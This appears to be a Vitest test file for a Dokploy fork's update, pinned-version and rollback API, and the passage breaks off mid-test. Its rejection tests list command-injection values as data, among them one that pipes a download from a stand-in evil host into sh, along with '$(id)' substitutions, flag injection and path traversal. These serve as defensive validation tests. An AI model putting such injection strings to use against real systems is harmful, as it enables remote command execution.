import { beforeEach, describe, expect, it, vi } from "vitest";
import packageInfo from "../../package.json";

const state = vi.hoisted(() => ({ isCloud: false, isRoot: true }));

const mocks = vi.hoisted(() => ({
	getDockerResourceType: vi.fn(),
	getLastUpdateAttempt: vi.fn(),
	getUpdateData: vi.fn(),
	getUpdateMigrationDelta: vi.fn(),
	readDokployRollbackPoint: vi.fn(),
	recordDokployRollbackPoint: vi.fn(),
	runBackgroundJob: vi.fn(),
	spawnAsync: vi.fn(),
	claimDokployUpdateAttempt: vi.fn(),
	transitionDokployUpdateAttempt: vi.fn(),
	audit: vi.fn(async (_ctx: unknown, _event: unknown) => undefined),
}));

vi.mock("@dokploy/server", () => ({
	get IS_CLOUD() {
		return state.isCloud;
	},
	isRootOrganization: async () => state.isRoot,
	getDockerResourceType: mocks.getDockerResourceType,
	getLastUpdateAttempt: mocks.getLastUpdateAttempt,
	getUpdateData: mocks.getUpdateData,
	getUpdateMigrationDelta: mocks.getUpdateMigrationDelta,
	readDokployRollbackPoint: mocks.readDokployRollbackPoint,
	recordDokployRollbackPoint: mocks.recordDokployRollbackPoint,
	runBackgroundJob: mocks.runBackgroundJob,
	spawnAsync: mocks.spawnAsync,
	claimDokployUpdateAttempt: mocks.claimDokployUpdateAttempt,
	transitionDokployUpdateAttempt: mocks.transitionDokployUpdateAttempt,
}));

vi.mock("@dokploy/server/lib/auth", () => ({
	validateRequest: vi.fn(),
}));

vi.mock("@/server/api/utils/audit", () => ({
	audit: mocks.audit,
}));

vi.mock("@/server/queues/queueSetup", () => ({
	cleanAllDeploymentQueue: vi.fn(),
}));

vi.mock("@/server/utils/backup", () => ({
	removeJob: vi.fn(),
	schedule: vi.fn(),
}));

const { settingsRouter } = await import("@/server/api/routers/settings");

const callerAs = (role: string) =>
	settingsRouter.createCaller({
		session: { activeOrganizationId: "org-a" },
		user: { id: "user-1", email: "admin@example.com", role },
	} as Parameters<typeof settingsRouter.createCaller>[0]);

const caller = callerAs("owner");

const REPO = "ghcr.io/devinosolutions/dokploy-community";
const DIGEST = `sha256:${"ab12".repeat(16)}`;

let jobs: Promise<unknown>[] = [];
let failures: unknown[] = [];

// The docker argv of every spawn, once the background jobs have settled.
const spawned = async () => {
	await Promise.all(jobs);
	return mocks.spawnAsync.mock.calls.map(([command, args]) => [
		command,
		...(args as string[]),
	]);
};

const serviceUpdate = (image: string) => [
	"docker",
	"service",
	"update",
	"--force",
	"--image",
	image,
	"dokploy",
];

const manifestInspect = (image: string) => [
	"docker",
	"manifest",
	"inspect",
	image,
];

const recordedPoint = { version: "v0.30.8-community.31", digest: DIGEST };

beforeEach(() => {
	vi.clearAllMocks();
	state.isCloud = false;
	state.isRoot = true;
	jobs = [];
	failures = [];
	// Like the real one: runs the job and never rejects.
	mocks.runBackgroundJob.mockImplementation(
		(_label: string, job: () => unknown) => {
			const run = Promise.resolve()
				.then(job)
				.catch((error) => {
					failures.push(error);
				});
			jobs.push(run);
			return run;
		},
	);
	mocks.spawnAsync.mockReset();
	mocks.spawnAsync.mockResolvedValue(Buffer.from(""));
	mocks.recordDokployRollbackPoint.mockReset();
	mocks.recordDokployRollbackPoint.mockResolvedValue(undefined);
	mocks.readDokployRollbackPoint.mockResolvedValue(null);
	mocks.claimDokployUpdateAttempt.mockReset();
	mocks.claimDokployUpdateAttempt.mockResolvedValue({
		claimed: true,
		recorded: true,
	});
	mocks.transitionDokployUpdateAttempt.mockReset();
	mocks.transitionDokployUpdateAttempt.mockResolvedValue(true);
	mocks.getLastUpdateAttempt.mockReset();
	mocks.getLastUpdateAttempt.mockResolvedValue(null);
	mocks.getDockerResourceType.mockResolvedValue("service");
	mocks.getUpdateData.mockResolvedValue({
		latestVersion: "v0.30.9-community.1",
		updateAvailable: true,
	});
});

// The attempts started, and every step recorded in order: the start, then the
// patch of each transition.
const started = () =>
	mocks.claimDokployUpdateAttempt.mock.calls.map(([attempt]) => attempt);
const attempts = () => [
	...started(),
	...mocks.transitionDokployUpdateAttempt.mock.calls.map(([, patch]) => patch),
];
const transitionedIds = () =>
	mocks.transitionDokployUpdateAttempt.mock.calls.map(([id]) => id);

describe("settings.updateServer without a target", () => {
	it("checks the image, pulls it and installs :<latestVersion>", async () => {
		await expect(caller.updateServer()).resolves.toBe(true);

		const image = `${REPO}:v0.30.9-community.1`;
		expect(mocks.getUpdateData).toHaveBeenCalledWith(packageInfo.version);
		expect(mocks.spawnAsync.mock.calls[0]).toEqual([
			"docker",
			["manifest", "inspect", image],
			undefined,
			{ timeout: 60_000 },
		]);
		expect(await spawned()).toEqual([
			manifestInspect(image),
			["docker", "pull", image],
			serviceUpdate(image),
		]);
		expect(mocks.runBackgroundJob).toHaveBeenCalledWith(
			"settings.updateServer background",
			expect.any(Function),
		);
		expect(mocks.audit).toHaveBeenCalledOnce();
		expect(mocks.audit.mock.calls[0]![1]).toStrictEqual({
			action: "update",
			resourceType: "settings",
			resourceName: "dokploy-version",
		});
	});

	it("records the running image after the pull and before the update", async () => {
		await caller.updateServer();
		await Promise.all(jobs);

		expect(mocks.recordDokployRollbackPoint).toHaveBeenCalledWith(
			packageInfo.version,
			{
				installing: undefined,
				installedImage: `${REPO}:v0.30.9-community.1`,
			},
		);
		const [, pull, update] = mocks.spawnAsync.mock.invocationCallOrder;
		const [record] = mocks.recordDokployRollbackPoint.mock.invocationCallOrder;
		expect(pull).toBeLessThan(record!);
		expect(record).toBeLessThan(update!);
	});

	it("still runs the exact update when recording rejects", async () => {
		mocks.recordDokployRollbackPoint.mockRejectedValue(new Error("boom"));

		await caller.updateServer();

		const image = `${REPO}:v0.30.9-community.1`;
		expect(await spawned()).toEqual([
			manifestInspect(image),
			["docker", "pull", image],
			serviceUpdate(image),
		]);
		expect(failures).toEqual([]);
	});

	it("refuses before queueing anything when the latest release can't be checked", async () => {
		mocks.getUpdateData.mockResolvedValue({
			latestVersion: null,
			updateAvailable: false,
			checkFailed: true,
			reason: "GitHub answered 403",
		});
		const error = vi.spyOn(console, "error").mockImplementation(() => {});

		await expect(caller.updateServer()).rejects.toMatchObject({
			code: "SERVICE_UNAVAILABLE",
			message: expect.stringContaining("Could not reach GitHub"),
		});
		await expect(caller.updateServer()).rejects.toMatchObject({
			message: expect.stringContaining("release tag as the target"),
		});

		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
		expect(mocks.recordDokployRollbackPoint).not.toHaveBeenCalled();
		expect(mocks.claimDokployUpdateAttempt).not.toHaveBeenCalled();
		expect(mocks.spawnAsync).not.toHaveBeenCalled();
		expect(mocks.audit).not.toHaveBeenCalled();
		error.mockRestore();
	});

	it("refuses with BAD_REQUEST when the server is already on the latest release", async () => {
		mocks.getUpdateData.mockResolvedValue({
			latestVersion: packageInfo.version,
			updateAvailable: false,
		});

		await expect(caller.updateServer()).rejects.toMatchObject({
			code: "BAD_REQUEST",
			message: `Already on ${packageInfo.version}, the latest release.`,
		});

		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
		expect(mocks.recordDokployRollbackPoint).not.toHaveBeenCalled();
		expect(mocks.claimDokployUpdateAttempt).not.toHaveBeenCalled();
		expect(mocks.spawnAsync).not.toHaveBeenCalled();
		expect(mocks.audit).not.toHaveBeenCalled();
	});

	it.each([
		["manifest unknown", `Image not found in ${REPO}.`],
		['Get "https://ghcr.io/v2/": i/o timeout', "Could not reach ghcr.io"],
	])(
		"refuses before queueing anything when the image check says %j",
		async (stderr, message) => {
			mocks.spawnAsync.mockRejectedValueOnce(new Error(stderr));
			const error = vi.spyOn(console, "error").mockImplementation(() => {});

			await expect(caller.updateServer()).rejects.toMatchObject({
				code: "BAD_REQUEST",
				message: expect.stringContaining(message),
			});

			expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
			expect(mocks.claimDokployUpdateAttempt).not.toHaveBeenCalled();
			expect(mocks.audit).not.toHaveBeenCalled();
			error.mockRestore();
		},
	);

	it("records each step of the attempt, ending as submitted", async () => {
		await caller.updateServer();
		await Promise.all(jobs);

		const image = `${REPO}:v0.30.9-community.1`;
		expect(attempts().map((attempt) => attempt.status)).toEqual([
			"pulling",
			"updating",
			"submitted",
		]);
		expect(started()).toEqual([
			{
				attemptId: expect.any(String),
				fromVersion: packageInfo.version,
				target: "v0.30.9-community.1",
				pinned: false,
				expectedVersion: "v0.30.9-community.1",
				image,
				startedAt: expect.any(String),
				status: "pulling",
			},
		]);
		expect(attempts()[2]).toMatchObject({
			status: "submitted",
			finishedAt: expect.any(String),
		});
		expect(attempts()[2]).not.toHaveProperty("errorCode");
		expect(new Set(transitionedIds())).toEqual(
			new Set([started()[0]!.attemptId]),
		);
	});

	it("records only a category when the pull fails, never the docker output", async () => {
		mocks.spawnAsync
			.mockResolvedValueOnce(Buffer.from("{}"))
			.mockRejectedValueOnce(new Error("toomanyrequests: rate limit"));

		await expect(caller.updateServer()).resolves.toBe(true);

		const image = `${REPO}:v0.30.9-community.1`;
		expect(await spawned()).toEqual([
			manifestInspect(image),
			["docker", "pull", image],
		]);
		expect(failures).toEqual([new Error("toomanyrequests: rate limit")]);
		expect(mocks.recordDokployRollbackPoint).not.toHaveBeenCalled();
		expect(attempts().map((attempt) => attempt.status)).toEqual([
			"pulling",
			"failed",
		]);
		expect(attempts()[1]).toEqual({
			status: "failed",
			finishedAt: expect.any(String),
			errorCode: "registry_rate_limited",
		});
	});

	it("never passes secret-bearing docker output to the record", async () => {
		const secret =
			'Get "https://user:hunter2@ghcr.io/v2/x?X-Amz-Signature=deadbeef": Authorization: Bearer abc123';
		mocks.spawnAsync
			.mockResolvedValueOnce(Buffer.from("{}"))
			.mockRejectedValueOnce(new Error(secret));

		await caller.updateServer();
		await Promise.all(jobs);

		const written = JSON.stringify([
			mocks.claimDokployUpdateAttempt.mock.calls,
			mocks.transitionDokployUpdateAttempt.mock.calls,
		]);
		for (const text of ["hunter2", "abc123", "deadbeef", "Bearer"]) {
			expect(written).not.toContain(text);
		}
	});

	it("records the attempt as failed when the service update fails", async () => {
		mocks.spawnAsync
			.mockResolvedValueOnce(Buffer.from("{}"))
			.mockResolvedValueOnce(Buffer.from(""))
			.mockRejectedValueOnce(new Error("update out of sequence"));

		await caller.updateServer();
		await Promise.all(jobs);

		expect(attempts().map((attempt) => attempt.status)).toEqual([
			"pulling",
			"updating",
			"failed",
		]);
		expect(attempts()[2]).toMatchObject({
			errorCode: "service_update_failed",
		});
	});

	it("refuses to start while another update is in progress", async () => {
		mocks.getLastUpdateAttempt.mockResolvedValue({ outcome: "in_progress" });

		await expect(caller.updateServer()).rejects.toMatchObject({
			code: "CONFLICT",
			message: "An update is already in progress.",
		});
		await expect(
			caller.updateServer({ target: "v0.30.8-community.32" }),
		).rejects.toMatchObject({ code: "CONFLICT" });

		expect(mocks.claimDokployUpdateAttempt).not.toHaveBeenCalled();
		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
		expect(mocks.spawnAsync).not.toHaveBeenCalled();
		expect(mocks.audit).not.toHaveBeenCalled();
	});

	it.each([
		["in_progress", "An update is already in progress."],
		["busy", "Another update is being started. Try again in a moment."],
	] as const)(
		"refuses when the claim itself is lost (%s), before any pull or swap",
		async (reason, message) => {
			// The early read passed; another request claimed in the meantime.
			mocks.claimDokployUpdateAttempt.mockResolvedValue({
				claimed: false,
				reason,
			});

			await expect(caller.updateServer()).rejects.toMatchObject({
				code: "CONFLICT",
				message,
			});

			expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
			expect(mocks.recordDokployRollbackPoint).not.toHaveBeenCalled();
			expect(mocks.transitionDokployUpdateAttempt).not.toHaveBeenCalled();
			expect(mocks.audit).not.toHaveBeenCalled();
			expect(await spawned()).toEqual([
				manifestInspect(`${REPO}:v0.30.9-community.1`),
			]);
		},
	);

	it("asks the claim to judge against the running version", async () => {
		await caller.updateServer();

		expect(mocks.claimDokployUpdateAttempt).toHaveBeenCalledWith(
			expect.objectContaining({ status: "pulling" }),
			{ runningVersion: packageInfo.version, force: undefined },
		);
	});

	it("starts over an in-progress attempt only when forced", async () => {
		mocks.getLastUpdateAttempt.mockResolvedValue({ outcome: "in_progress" });

		await expect(caller.updateServer({ force: true })).resolves.toBe(true);

		expect(mocks.claimDokployUpdateAttempt).toHaveBeenCalledWith(
			expect.anything(),
			{ runningVersion: packageInfo.version, force: true },
		);
	});

	it("stops after the pull, before the rollback point and the swap, when the attempt was replaced", async () => {
		mocks.transitionDokployUpdateAttempt.mockResolvedValue(false);
		const error = vi.spyOn(console, "error").mockImplementation(() => {});

		await expect(caller.updateServer()).resolves.toBe(true);

		const image = `${REPO}:v0.30.9-community.1`;
		expect(await spawned()).toEqual([
			manifestInspect(image),
			["docker", "pull", image],
		]);
		expect(mocks.recordDokployRollbackPoint).not.toHaveBeenCalled();
		// Only the move to `updating` was tried; nothing recorded as failed.
		expect(mocks.transitionDokployUpdateAttempt).toHaveBeenCalledOnce();
		expect(failures).toEqual([]);
		error.mockRestore();
	});

	it("claims the attempt before the rollback point is recorded", async () => {
		await caller.updateServer();
		await Promise.all(jobs);

		const [updating] = mocks.transitionDokployUpdateAttempt.mock
			.invocationCallOrder as [number];
		const [record] = mocks.recordDokployRollbackPoint.mock.invocationCallOrder;
		expect(updating).toBeLessThan(record!);
	});

	it("goes on when the record could not be written: there is nothing to own", async () => {
		mocks.claimDokployUpdateAttempt.mockResolvedValue({
			claimed: true,
			recorded: false,
		});
		mocks.transitionDokployUpdateAttempt.mockResolvedValue(false);

		await caller.updateServer();

		const image = `${REPO}:v0.30.9-community.1`;
		expect(await spawned()).toEqual([
			manifestInspect(image),
			["docker", "pull", image],
			serviceUpdate(image),
		]);
	});

	it.each(["interrupted", "failed", "applied", "submitted", "mismatch"])(
		"starts a new update after an attempt that is %s",
		async (outcome) => {
			mocks.getLastUpdateAttempt.mockResolvedValue({ outcome });

			await expect(caller.updateServer()).resolves.toBe(true);
			expect(mocks.claimDokployUpdateAttempt).toHaveBeenCalledOnce();
		},
	);

	it("keeps two attempts apart: each job moves only its own record", async () => {
		await caller.updateServer();
		await caller.updateServer();
		await Promise.all(jobs);

		const [a, b] = started();
		expect(a!.attemptId).not.toBe(b!.attemptId);
		const ids = transitionedIds();
		expect(ids.filter((id) => id === a!.attemptId)).toHaveLength(2);
		expect(ids.filter((id) => id === b!.attemptId)).toHaveLength(2);
	});

	it.each([[{}], [{ rollback: false }]])(
		"treats %j like no input",
		async (input) => {
			await caller.updateServer(input);

			const image = `${REPO}:v0.30.9-community.1`;
			expect(mocks.readDokployRollbackPoint).not.toHaveBeenCalled();
			expect(await spawned()).toEqual([
				manifestInspect(image),
				["docker", "pull", image],
				serviceUpdate(image),
			]);
		},
	);
});

describe("settings.updateServer with a pinned target", () => {
	it.each([
		[
			"v0.30.8-community.32.1",
			`${REPO}:v0.30.8-community.32.1`,
			{ tag: "v0.30.8-community.32.1" },
		],
		[
			"v0.30.8-community.1",
			`${REPO}:v0.30.8-community.1`,
			{
				tag: "v0.30.8-community.1",
			},
		],
	])("%s checks, pulls and installs %s", async (target, image, installing) => {
		await expect(caller.updateServer({ target })).resolves.toBe(true);

		expect(mocks.getUpdateData).not.toHaveBeenCalled();
		expect(mocks.spawnAsync.mock.calls[0]).toEqual([
			"docker",
			["manifest", "inspect", image],
			undefined,
			{ timeout: 60_000 },
		]);
		expect(await spawned()).toEqual([
			manifestInspect(image),
			["docker", "pull", image],
			serviceUpdate(image),
		]);
		// Recorded after the pull, before the service update.
		expect(mocks.recordDokployRollbackPoint).toHaveBeenCalledWith(
			packageInfo.version,
			{ installing, installedImage: image },
		);
		const [, pull, update] = mocks.spawnAsync.mock.invocationCallOrder;
		const [record] = mocks.recordDokployRollbackPoint.mock.invocationCallOrder;
		expect(pull).toBeLessThan(record!);
		expect(record).toBeLessThan(update!);
		expect(mocks.audit.mock.calls[0]![1]).toStrictEqual({
			action: "update",
			resourceType: "settings",
			resourceName: "dokploy-version",
			metadata: { target, rollback: false },
		});
	});

	it.each([
		["manifest unknown", `Image not found in ${REPO}.`],
		[
			"no such manifest: ghcr.io/devinosolutions/dokploy-community:v9.9.9-community.1",
			`Image not found in ${REPO}.`,
		],
		[
			"no such manifest: ghcr.io/devinosolutions/dokploy-community:v9.9.9: not found",
			`Image not found in ${REPO}.`,
		],
		[
			'Get "https://ghcr.io/v2/": dial tcp: i/o timeout',
			"Could not reach ghcr.io to check the image; try again.",
		],
		["", "Could not reach ghcr.io to check the image; try again."],
	])(
		"refuses before queueing anything when the check says %j",
		async (stderr, message) => {
			mocks.spawnAsync.mockRejectedValueOnce(new Error(stderr));
			const error = vi.spyOn(console, "error").mockImplementation(() => {});

			await expect(
				caller.updateServer({ target: "v9.9.9-community.1" }),
			).rejects.toMatchObject({ code: "BAD_REQUEST", message });

			expect(error).toHaveBeenCalledWith(
				"settings.updateServer manifest inspect failed:",
				stderr,
			);
			expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
			expect(mocks.recordDokployRollbackPoint).not.toHaveBeenCalled();
			expect(mocks.audit).not.toHaveBeenCalled();
			error.mockRestore();
		},
	);

	it("keeps the service and the rollback point when the pull fails", async () => {
		mocks.spawnAsync
			.mockResolvedValueOnce(Buffer.from("{}"))
			.mockRejectedValueOnce(new Error("pull failed"));

		await caller.updateServer({ target: "v0.30.8-community.32.1" });

		expect(await spawned()).toEqual([
			manifestInspect(`${REPO}:v0.30.8-community.32.1`),
			["docker", "pull", `${REPO}:v0.30.8-community.32.1`],
		]);
		expect(failures).toEqual([new Error("pull failed")]);
		expect(mocks.recordDokployRollbackPoint).not.toHaveBeenCalled();
		expect(attempts().map((attempt) => attempt.status)).toEqual([
			"pulling",
			"failed",
		]);
		expect(attempts()[1]).toMatchObject({
			status: "failed",
			errorCode: "pull_failed",
		});
		expect(started()[0]).toMatchObject({
			target: "v0.30.8-community.32.1",
			pinned: true,
			expectedVersion: "v0.30.8-community.32.1",
			image: `${REPO}:v0.30.8-community.32.1`,
		});
	});

	it("records a pinned attempt under its tag, and a rollback under its digest and the point's version", async () => {
		await caller.updateServer({ target: "v0.30.8-community.32.1" });
		await Promise.all(jobs);
		expect(started()[0]).toMatchObject({
			target: "v0.30.8-community.32.1",
			pinned: true,
			expectedVersion: "v0.30.8-community.32.1",
		});
		expect(attempts().at(-1)).toMatchObject({ status: "submitted" });

		mocks.claimDokployUpdateAttempt.mockClear();
		mocks.transitionDokployUpdateAttempt.mockClear();
		mocks.readDokployRollbackPoint.mockResolvedValue(recordedPoint);
		await caller.updateServer({ rollback: true });
		await Promise.all(jobs);
		expect(started()[0]).toMatchObject({
			target: DIGEST,
			pinned: true,
			expectedVersion: recordedPoint.version,
			image: `${REPO}@${DIGEST}`,
		});
		expect(attempts().at(-1)).toMatchObject({ status: "submitted" });
	});

	it("records the rollback point's version for a bare digest too", async () => {
		mocks.readDokployRollbackPoint.mockResolvedValue(recordedPoint);

		await caller.updateServer({ target: DIGEST });

		expect(started()[0]).toMatchObject({
			target: DIGEST,
			expectedVersion: recordedPoint.version,
		});
	});

	it.each([
		"v0.30.8-community.1",
		"v0.30.8-community.1.1",
		"v0.30.9",
		"v0.31.0-community.1",
		"v1.0.0",
	])("accepts %s, at or above the floor", async (target) => {
		await expect(caller.updateServer({ target })).resolves.toBe(true);
		expect(await spawned()).toContainEqual(serviceUpdate(`${REPO}:${target}`));
	});

	it.each([
		"v0.30.8",
		"v0.30.7-community.40",
		"v0.29.12-community.1",
		"v0.29.11-community.1",
		"v0.29.8",
	])("refuses %s, below the floor v0.30.8-community.1", async (target) => {
		await expect(caller.updateServer({ target })).rejects.toMatchObject({
			code: "BAD_REQUEST",
			message: expect.stringContaining("v0.30.8-community.1"),
		});
		expect(mocks.spawnAsync).not.toHaveBeenCalled();
		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
	});

	it("accepts a bare digest only when it is the recorded rollback", async () => {
		mocks.readDokployRollbackPoint.mockResolvedValue(recordedPoint);

		await caller.updateServer({ target: DIGEST });

		expect(await spawned()).toEqual([
			manifestInspect(`${REPO}@${DIGEST}`),
			["docker", "pull", `${REPO}@${DIGEST}`],
			serviceUpdate(`${REPO}@${DIGEST}`),
		]);
	});

	it.each([
		["no record", null],
		[
			"another recorded digest",
			{ ...recordedPoint, digest: `sha256:${"f".repeat(64)}` },
		],
	])("refuses a bare digest with %s", async (_name, point) => {
		mocks.readDokployRollbackPoint.mockResolvedValue(point);

		await expect(caller.updateServer({ target: DIGEST })).rejects.toMatchObject(
			{
				code: "BAD_REQUEST",
				message: expect.stringContaining("recorded rollback"),
			},
		);
		expect(mocks.spawnAsync).not.toHaveBeenCalled();
		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
	});

	it.each([
		"latest",
		"canary",
		"v0.30.8-community.32 ",
		" v0.30.8-community.32",
		"v0.30.8-community.32\n",
		"v0.30.8-community.32\r",
		"v0.30.8-community.32\u0000",
		"v0.30.8-community.32 ",
		"v0.30.8-community.32;id",
		"v0.30.8-community.32 && curl evil.sh | sh",
		"$(id)",
		"`id`",
		"ghcr.io/evil/dokploy-community:v0.30.8-community.32",
		"dokploy/dokploy:v0.30.8-community.32",
		`${REPO}:v0.30.8-community.32`,
		`${REPO}@${DIGEST}`,
		`evil.io/x@${DIGEST}`,
		// A tag with a digest: nothing proves the digest is that tag's image.
		`v0.30.8-community.32@${DIGEST}`,
		`v0.29.8@${DIGEST}`,
		`v0.30.8-community.32@${DIGEST} --detach`,
		`v0.30.8-community.32@@${DIGEST}`,
		`v0.30.8-community.32@sha256:${"A".repeat(64)}`,
		`${DIGEST} --detach`,
		"--help",
		"",
	])("rejects %j before anything runs", async (target) => {
		await expect(caller.updateServer({ target })).rejects.toMatchObject({
			code: "BAD_REQUEST",
		});

		expect(mocks.recordDokployRollbackPoint).not.toHaveBeenCalled();
		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
		expect(mocks.spawnAsync).not.toHaveBeenCalled();
		expect(mocks.audit).not.toHaveBeenCalled();
	});

	it("rejects a target together with rollback", async () => {
		await expect(
			caller.updateServer({ target: "v0.30.8-community.32", rollback: true }),
		).rejects.toMatchObject({ code: "BAD_REQUEST" });
		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
	});
});

describe("settings.updateServer rollback", () => {
	it("installs the recorded digest through the pinned path", async () => {
		mocks.readDokployRollbackPoint.mockResolvedValue(recordedPoint);

		await expect(caller.updateServer({ rollback: true })).resolves.toBe(true);

		expect(mocks.readDokployRollbackPoint).toHaveBeenCalledWith(
			packageInfo.version,
		);
		expect(mocks.getUpdateData).not.toHaveBeenCalled();
		expect(await spawned()).toEqual([
			manifestInspect(`${REPO}@${DIGEST}`),
			["docker", "pull", `${REPO}@${DIGEST}`],
			serviceUpdate(`${REPO}@${DIGEST}`),
		]);
		expect(mocks.recordDokployRollbackPoint).toHaveBeenCalledWith(
			packageInfo.version,
			{ installing: { digest: DIGEST }, installedImage: `${REPO}@${DIGEST}` },
		);
		expect(mocks.audit.mock.calls[0]![1]).toMatchObject({
			resourceName: "dokploy-version",
			metadata: { target: DIGEST, rollback: true },
		});
	});

	it("re-validates the recorded digest", async () => {
		mocks.readDokployRollbackPoint.mockResolvedValue({
			...recordedPoint,
			digest: `${DIGEST}; id`,
		});

		await expect(caller.updateServer({ rollback: true })).rejects.toMatchObject(
			{ code: "BAD_REQUEST" },
		);
		expect(mocks.spawnAsync).not.toHaveBeenCalled();
		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
	});

	it("refuses when no previous version is recorded", async () => {
		await expect(caller.updateServer({ rollback: true })).rejects.toMatchObject(
			{ code: "BAD_REQUEST", message: expect.stringContaining("roll back") },
		);
		expect(mocks.spawnAsync).not.toHaveBeenCalled();
		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
		expect(mocks.audit).not.toHaveBeenCalled();
	});
});

describe("settings.getUpdateRollback", () => {
	it("offers the recorded previous version", async () => {
		mocks.readDokployRollbackPoint.mockResolvedValue(recordedPoint);

		await expect(caller.getUpdateRollback()).resolves.toEqual(recordedPoint);
		expect(mocks.readDokployRollbackPoint).toHaveBeenCalledWith(
			packageInfo.version,
		);
	});

	it("offers nothing when no point is recorded", async () => {
		await expect(caller.getUpdateRollback()).resolves.toBeNull();
	});

	it("is refused to an organization that doesn't own the instance", async () => {
		state.isRoot = false;
		mocks.readDokployRollbackPoint.mockResolvedValue(recordedPoint);

		await expect(caller.getUpdateRollback()).rejects.toMatchObject({
			code: "FORBIDDEN",
		});
		expect(mocks.readDokployRollbackPoint).not.toHaveBeenCalled();
	});

	it("passes the record date through", async () => {
		const dated = { ...recordedPoint, recordedAt: "2026-10-27T10:00:00.000Z" };
		mocks.readDokployRollbackPoint.mockResolvedValue(dated);

		await expect(caller.getUpdateRollback()).resolves.toEqual(dated);
	});
});

describe("settings.getLastUpdateAttempt", () => {
	const attempt = {
		fromVersion: "v0.30.8-community.36",
		target: "v0.30.8-community.37",
		image: `${REPO}:v0.30.8-community.37`,
		startedAt: "2026-10-29T10:00:00.000Z",
		finishedAt: "2026-10-29T10:01:00.000Z",
		status: "submitted",
		versionMismatch: true,
	};

	it("returns the recorded attempt with the version check", async () => {
		mocks.getLastUpdateAttempt.mockResolvedValue(attempt);

		await expect(caller.getLastUpdateAttempt()).resolves.toEqual(attempt);
		expect(mocks.getLastUpdateAttempt).toHaveBeenCalledWith(
			packageInfo.version,
		);
	});

	it("returns null when nothing is recorded", async () => {
		await expect(caller.getLastUpdateAttempt()).resolves.toBeNull();
	});

	it("is refused to a member and to an organization that doesn't own the instance", async () => {
		await expect(
			callerAs("member").getLastUpdateAttempt(),
		).rejects.toMatchObject({ code: "UNAUTHORIZED" });
		state.isRoot = false;
		await expect(caller.getLastUpdateAttempt()).rejects.toMatchObject({
			code: "FORBIDDEN",
		});
		expect(mocks.getLastUpdateAttempt).not.toHaveBeenCalled();
	});

	it("does nothing on cloud", async () => {
		state.isCloud = true;
		mocks.getLastUpdateAttempt.mockResolvedValue(attempt);

		await expect(caller.getLastUpdateAttempt()).resolves.toBeNull();
		expect(mocks.getLastUpdateAttempt).not.toHaveBeenCalled();
	});
});

describe("settings.getUpdateMigrationDelta", () => {
	const delta = {
		status: "ok",
		runningVersion: packageInfo.version,
		targetVersion: "v0.30.8-community.35",
		applies: ["0225_example"],
		staysApplied: [],
	};

	beforeEach(() => {
		mocks.getUpdateMigrationDelta.mockResolvedValue(delta);
	});

	it("checks the running version against the target tag", async () => {
		await expect(
			caller.getUpdateMigrationDelta({ version: "v0.30.8-community.35" }),
		).resolves.toEqual(delta);
		expect(mocks.getUpdateMigrationDelta).toHaveBeenCalledWith(
			packageInfo.version,
			"v0.30.8-community.35",
		);
	});

	it("passes an unavailable check through instead of failing", async () => {
		mocks.getUpdateMigrationDelta.mockResolvedValue({ status: "unavailable" });

		await expect(
			caller.getUpdateMigrationDelta({ version: "v0.30.8-community.35" }),
		).resolves.toEqual({ status: "unavailable" });
	});

	it.each([
		"latest",
		DIGEST,
		"../v0.30.8-community.35",
		"v0.30.8-community.35/../../x",
	])("rejects %s, which is not a release tag", async (version) => {
		await expect(
			caller.getUpdateMigrationDelta({ version }),
		).rejects.toMatchObject({ code: "BAD_REQUEST" });
		expect(mocks.getUpdateMigrationDelta).not.toHaveBeenCalled();
	});

	it("a member can't run it", async () => {
		await expect(
			callerAs("member").getUpdateMigrationDelta({
				version: "v0.30.8-community.35",
			}),
		).rejects.toMatchObject({ code: "UNAUTHORIZED" });
		expect(mocks.getUpdateMigrationDelta).not.toHaveBeenCalled();
	});

	it("is refused to an organization that doesn't own the instance", async () => {
		state.isRoot = false;

		await expect(
			caller.getUpdateMigrationDelta({ version: "v0.30.8-community.35" }),
		).rejects.toMatchObject({ code: "FORBIDDEN" });
		expect(mocks.getUpdateMigrationDelta).not.toHaveBeenCalled();
	});

	it("does nothing on cloud", async () => {
		state.isCloud = true;

		await expect(
			caller.getUpdateMigrationDelta({ version: "v0.30.8-community.35" }),
		).resolves.toEqual({ status: "unavailable" });
		expect(mocks.getUpdateMigrationDelta).not.toHaveBeenCalled();
	});
});

describe("permission and cloud guards", () => {
	it.each([
		["update", () => callerAs("member").updateServer()],
		[
			"pinned update",
			() => callerAs("member").updateServer({ target: "v0.30.8-community.32" }),
		],
		["rollback", () => callerAs("member").updateServer({ rollback: true })],
		["rollback lookup", () => callerAs("member").getUpdateRollback()],
	])("a member can't run the %s", async (_name, run) => {
		await expect(run()).rejects.toMatchObject({ code: "UNAUTHORIZED" });
		expect(mocks.spawnAsync).not.toHaveBeenCalled();
		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
		expect(mocks.readDokployRollbackPoint).not.toHaveBeenCalled();
	});

	it("an admin can run a pinned update", async () => {
		await expect(
			callerAs("admin").updateServer({ target: "v0.30.8-community.32" }),
		).resolves.toBe(true);
	});

	it("does nothing on cloud", async () => {
		state.isCloud = true;
		mocks.readDokployRollbackPoint.mockResolvedValue(recordedPoint);

		await expect(
			caller.updateServer({ target: "v0.30.8-community.32" }),
		).resolves.toBe(true);
		await expect(caller.updateServer({ rollback: true })).resolves.toBe(true);
		await expect(caller.getUpdateRollback()).resolves.toBeNull();
		expect(mocks.spawnAsync).not.toHaveBeenCalled();
		expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
		expect(mocks.recordDokployRollbackPoint).not.toHaveBeenCalled();
		expect(mocks.readDokployRollbackPoint).not.toHaveBeenCalled();
	});
});

describe("settings.updateServer when Dokploy is not a Docker service", () => {
	it.each(["unknown", "standalone"])(
		"refuses a %s resource before it checks for updates or runs docker",
		async (resourceType) => {
			mocks.getDockerResourceType.mockResolvedValue(resourceType);

			await expect(caller.updateServer()).rejects.toMatchObject({
				code: "BAD_REQUEST",
				message: expect.stringContaining("not running as a Docker service"),
